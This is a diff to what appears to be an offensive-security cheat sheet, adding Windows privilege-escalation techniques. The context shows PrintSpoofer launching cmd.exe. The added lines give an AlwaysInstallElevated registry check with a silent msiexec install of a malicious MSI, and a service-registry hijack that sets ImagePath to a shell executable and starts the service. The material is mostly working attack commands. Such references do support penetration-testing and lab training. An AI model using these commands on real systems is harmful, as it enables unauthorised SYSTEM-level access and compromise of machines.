@@ -375,6 +375,15 @@ Include multiple variations for different OS targets and filtering environments.
   PrintSpoofer.exe -c "cmd.exe" -i
   ```
 
+- **AlwaysInstallElevated (Registry Abuse):**
+  - *Verify*: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+  - *Exploit*: `msiexec /quiet /qn /i C:\temp\setup.msi`
+
+- **Registry Service Hijack (ImagePath):**
+  - *Action*: If you have write access to service registry key.
+  - `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\[SERVICE] -Name ImagePath -Value "C:\temp\shell.exe"`
+  - `Start-Service [SERVICE]`
+
 ---
 
 ## 5. Utilities & Post-Exploitation
